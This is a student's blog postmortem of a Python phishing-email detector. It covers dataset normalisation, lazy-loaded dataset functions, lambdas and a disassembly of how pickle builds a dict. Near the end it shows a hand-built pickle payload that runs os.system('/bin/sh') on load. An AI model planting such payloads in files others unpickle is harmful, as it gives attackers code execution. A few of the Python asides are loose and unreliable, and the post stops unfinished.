---
layout: post
title: project postmortem
date: 2025-10-18 05:40:00 +0800
---

i had to do a uni python proj that involved writing a 'phishing email detector'. it was fun and i liked doing it. here is some overly technical, recherche nonsense about the implementation details of things that i want to talk about.

### project specifications

essentially it just had to be a web app that would take in an email and determine whether or not it was phishing based on some pre-defined criteria. there is not a lot of space for creativity within these criteria (altho i think my teammates did a vv good job of coming up with cool interesting stuff to implement that wasn't specified in the proj requirements) and so a lot of the interesting stuff i encountered was actually in the nitty gritty implementation details of stuff, like:

### big data

so the way our model worked is we would have certain criteria (functions) that wld accept a `ProcessedEmail` class and return an integer. using a labeled dataset of emails (w/ label corresponding to phishing \| non-phishing), collect the `int` avgs of how each category of email 'performs' against the different criteria, which provides a good benchmark w/ which to compare.

```py
class ProcessedEmail:
    def __init__(self, sender: str, 
                       message: str, 
                       subject: str, 
                       attachments: list, 
                       is_phishing: bool,
                       auxiliary_scans_enabled: bool):
        self.sender = sender
        self.message = message
        self.subject = subject
        self.attachments = attachments
        self.is_phishing = is_phishing
        self.auxiliary_scans_enabled = auxiliary_scans_enabled
```

e.g. say for a certain criteria `domain-check` most non-phishing emails score -0.5 around there, and most phishing emails score 0.5. if i test an email and it scores 0.9, it's likely to be phishing, for obvious reasons. we just take our score and see which average it's nearer to.

our dataset was around 50k emails large spread out across multiple `.csv` files which necessitates normalization - different `.csv` files, different header cols, also some cols wld just be completely nulled out - also what happens if i want to add more files

to make this easier for myself i just made the following file:

```py
[
    {
        "filename": "CEAS_08.csv",
        "cols": {
            "sender": "sender",
            "message": "body",
            "subject": "subject",
            "attachments": null,
            "is_phishing": "label"
        }
    },
    {
        "filename": "Ling.csv",
        "cols": {
            "sender": null,
            "message": "body",
            "subject": "subject",
            "attachments": null,
            "is_phishing": "label"
        }
    },
    {
        "filename": "SpamAssasin.csv",
        "cols": {
            "sender": null,
            "message": "body",
            "subject": "subject",
            "attachments": null,
            "is_phishing": "label"
        }
    }
]
```

neat little `metadata.json` file that i can just add to if i ever want to change anything, and this is kind of a microcosm of my design philosophy throughout the whole thing: i want to be able to add stuff quick and i want to make it easier for myself to do so, no hard-baking any values it should be directory \| os \| filename \| colname agnostic or whatever. we were also graded for 'modularity' and 'reusability' so i suppose this falls under that rubric

anyways so the actual way this gets stored is as a python pickle file:

```py
def normalize_email_datasets(email_csv_files: list) -> list:
    emails = []
    for f in email_csv_files:
        file = current_filepath(__file__) / 'datasets' / 'emails' / f['filename']
        cols = f['cols']
        with open(file, newline='', encoding='utf-8', errors='ignore') as csvfile:
            rows = csv.DictReader(csvfile)
            for row in rows:
                for col in cols:
                    if cols[col] is None:
                        row[col] = None
                    else:
                        row[col] = row[cols[col]]
                emails.append({
                    'sender': row['sender'],
                    'message': row['message'],
                    'subject': row['subject'],
                    'attachments': row['attachments'],
                    'is_phishing': int(row['is_phishing']),
                    'auxiliary_scans_enabled': False
                })
    return emails
```

we first generate this list and then we pickle it


```py
def initialize_datasets() -> dict:
    with open(current_filepath(__file__) / 'datasets' / 'emails' / 'metadata.json') as f:
        email_csv_files = json.load(f)
    with open(current_filepath(__file__) / 'datasets' / 'domains' / 'metadata.json') as f:
        domain_files = json.load(f)
    compiled_datasets = {}
    dataset_list = [
        {
            'filename': 'emails',
            'function': dataset_functions.normalize_email_datasets,
            'args': lambda: (email_csv_files,)
        },
        {
            'filename': 'keywords',
            'function': dataset_functions.get_keywords,
            'args': lambda: (compiled_datasets['emails'],)
        },
        {
            'filename': 'domains',
            'function': dataset_functions.normalize_domain_datasets,
            'args': lambda: (domain_files,)
        }
    ]
    for data_dict in dataset_list:
        filepath = (current_filepath(__file__) / 'pickled-datasets' / data_dict['filename']).with_suffix('.pkl')
        if filepath.is_file():
            print(f'{data_dict["filename"]} already saved to disk!')
        else:
            print(f'{data_dict["filename"]} not saved to disk. generating from scratch - this might take a while...')
            args = data_dict['args']()
            dataset = data_dict['function'](*args)
            with open(filepath, 'wb') as file: 
                    pickle.dump(dataset, file)
        compiled_datasets[data_dict['filename']] = filepath 
    return compiled_datasets
```

again note that i actually just store all the dataset funcs in a dict that i can just add to at will:

```py
dataset_list = [
    {
        'filename': 'emails',
        'function': dataset_functions.normalize_email_datasets,
        'args': lambda: (email_csv_files,)
    },
    {
        'filename': 'keywords',
        'function': dataset_functions.get_keywords,
        'args': lambda: (compiled_datasets['emails'],)
    },
    {
        'filename': 'domains',
        'function': dataset_functions.normalize_domain_datasets,
        'args': lambda: (domain_files,)
    }
```

also some of the datasets r actually dependent on other datasets to be generated, so we use a lil trick by lazily loading them - if we load them on runtime, they wont be defined, and the code will error. but if we wrap in a function, the values will only get returned when that func is called, so we can resolve the refs when they actually exist

this results in really ugly code but its ok, the way we actlly cal the funcs is even uglier:

```py
args = data_dict['args']()
dataset = data_dict['function'](*args)
```

so first we have to _call_ the func `args()` to get our arg tup, then we need to unpack it w/ the unpacking star op to pass it as a valid arg tuple. we actually need it as a tuple because python funcs always require tuples to be their input. it can just be a singleton tuple or actually a tuple w/ nothing in it as w a method like `sort()` for strings but, you need that tuple because i _think_ that's how it works on the cpython lvl - it's also how it works on the bytecode level, too

### brief diversion into lambda calc

so thats decently cursed but i found it quite cool bc it shows that funcs are just like any other object and can be called 'indirectly', consider the following

```py
z = (lambda x: x+x)(5)
```

like thats just defining a func and then calling it afterwards which is perfectly fine if not a bit weird looking but this is the basis for more complicated currying:

```py
z = (lambda x, y: x(y))((lambda x: x*x), 2)
```

like this is a mess of brackets but still works because of the same kind of concept, it's highly unintuitive (as lambda calculus is wont to be) but like.. it makes sense:

```py
def second_order_func(first_order_func, y):
  return first_order_func(y)

f = lambda x: x*x
z = second_order_func(f, 2)
```

both are equivalent codeblocks that do the exact same thing one's just more obfuscated. once you internalize the idea that a function is just an object like any other, you can do a lot of neat stuff!

### python pickle-chan

i got a love hate relationship w/ pickle, it was completely unnecessary for this proj imo but i just really wanted to use it (which led to python segfaults). i have a lot of niche knowledge abt python pickles because i am a deranged loser. given this is my blog i am going to inundate you with that knowledge.

a python pickle is actually a stack machine

yea

isnt that fucked up

```py
>>> pickletools.dis(z.read()[:1000])
    0: \x80 PROTO      4
    2: \x95 FRAME      65543
   11: }    EMPTY_DICT
   12: \x94 MEMOIZE    (as 0)
   13: (    MARK
   14: \x8c     SHORT_BINUNICODE '0123456789nonexistent.com'
   41: \x94     MEMOIZE    (as 1)
   42: \x89     NEWFALSE
   43: \x8c     SHORT_BINUNICODE '0980b6e8fe.com'
   59: \x94     MEMOIZE    (as 2)
   60: \x89     NEWFALSE
   61: \x8c     SHORT_BINUNICODE '0aa0cf0637d66c0d.com'
   83: \x94     MEMOIZE    (as 3)
   84: \x89     NEWFALSE
   85: \x8c     SHORT_BINUNICODE '0b8c767b16.com'
  101: \x94     MEMOIZE    (as 4)
  102: \x89     NEWFALSE
  103: \x8c     SHORT_BINUNICODE '0cf.io'
  111: \x94     MEMOIZE    (as 5)
  112: \x89     NEWFALSE
  113: \x8c     SHORT_BINUNICODE '0cgrf.site'
  125: \x94     MEMOIZE    (as 6)
  126: \x89     NEWFALSE
  127: \x8c     SHORT_BINUNICODE '0d9539106a.com'
```

`proto, frame` r just metadata and not esp relevant but you can see the following:

`EMPTY_DICT` pushes a dict obj on the stack, and then `MARK` marks the 'beginning' of this dict

from here on out, we keep pushing more things onto the stack, which are actually just our `(key, value)` pairs in our dict, one by one, w/ `SHORT_BINUNICODE` and `NEWFALSE` or `NEWTRUE`.

```py
425719: \x8c     SHORT_BINUNICODE '18.208.133.97'
425734: \x94     MEMOIZE    (as 19997)
425735: \x88     NEWTRUE
425736: \x8c     SHORT_BINUNICODE '18.208.167.36'
425751: \x94     MEMOIZE    (as 19998)
425752: \x88     NEWTRUE
425753: \x8c     SHORT_BINUNICODE '18.208.170.115'
425769: \x94     MEMOIZE    (as 19999)
425770: \x88     NEWTRUE
425771: \x8c     SHORT_BINUNICODE '18.208.206.155'
425787: \x94     MEMOIZE    (as 20000)
425788: \x88     NEWTRUE
425789: u        SETITEMS   (MARK at 402582)
425790: (    MARK
425791: \x8c     SHORT_BINUNICODE '18.208.206.239'
425807: \x94     MEMOIZE    (as 20001)
425808: \x88     NEWTRUE
425809: u        SETITEMS   (MARK at 425790)
425810: .    STOP
highest protocol among opcodes = 4
```

then the `SETITEMS` opcode takes all the `key, val` pairs, beginning from the previous `MARK` object, and appends them to our `EMPTY_DICT` func. this actually exhausts the items on the stack by 'merging' them into the dict, so after `SETITEMS` the unicode strings and bool values disappear from the stack

afterwards when we end execution, the thing on the top of the stack is our built item - in this case, the finished dict:

```py
18.205.152.115 True
18.205.210.75 True
18.205.31.84 True
18.205.65.34 True
18.206.157.40 True
18.206.179.68 True
18.206.22.189 True
18.206.236.14 True
18.206.64.201 True
18.206.87.76 True
18.207.103.195 True
18.207.110.64 True
18.207.179.6 True
18.207.211.246 True
18.207.9.112 True
18.208.133.97 True
18.208.167.36 True
18.208.170.115 True
18.208.206.155 True
18.208.206.239 True
```

we can see that our dict gets built as per normal

mad freaky

as an aside, ofc, given that these r just stack machines, u can just write ur own pickles by handcrafting the bytecode - in fact, you can handcraft _python_ bytecode too. this is something i have learned how to do because i am insane but i will save it for a later blogpost. but just to prove it here's a minimal shell w/ pickle bytecode, for POCs people typically create an actual pickle and just override the `reduce` attr but it's rare to see shit like, for example, this:

```py
from pickle import *

p = b''
p += GLOBAL + b'os\nsystem\n'
p += UNICODE + b'/bin/sh\n'
p += TUPLE1 + REDUCE
p += STOP

loads(p)
```

### segfaultonomics

so somehow this shit would segfault. how? i have no fucking idea lmfao

to do: finish this post...
